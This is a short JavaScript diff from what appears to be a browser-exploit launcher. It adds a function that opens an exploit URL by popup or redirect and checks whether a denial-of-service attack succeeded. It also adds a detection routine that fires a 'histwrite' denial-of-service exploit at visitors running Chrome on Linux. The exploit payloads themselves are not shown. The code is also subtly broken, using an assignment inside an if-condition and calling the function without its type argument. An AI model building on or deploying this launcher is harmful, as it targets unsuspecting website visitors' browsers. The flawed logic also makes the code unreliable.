@@ -20,14 +20,25 @@ function initdata() {
   browser=browse.split(' ')[0]
   version=browse.split(' ')[1]
 }
-function try(exploit,type) {
+function tryex(exploit,type) {
   try {
     window.open(exploit)
   }
   catch(err) {
     window.location.href=exploit;
   }
+  if(type="dos") {
+      if(navigator.onLine==true) {
+          return "failed";
+      }
+      else {
+          return "dossed";
+      }
+  }
 }
 function detect() {
-  
+    if(browser=="Chrome" && os=="Linux") {
+        tryex(exploits['dos']['histwrite']);
+        
+    }
 }
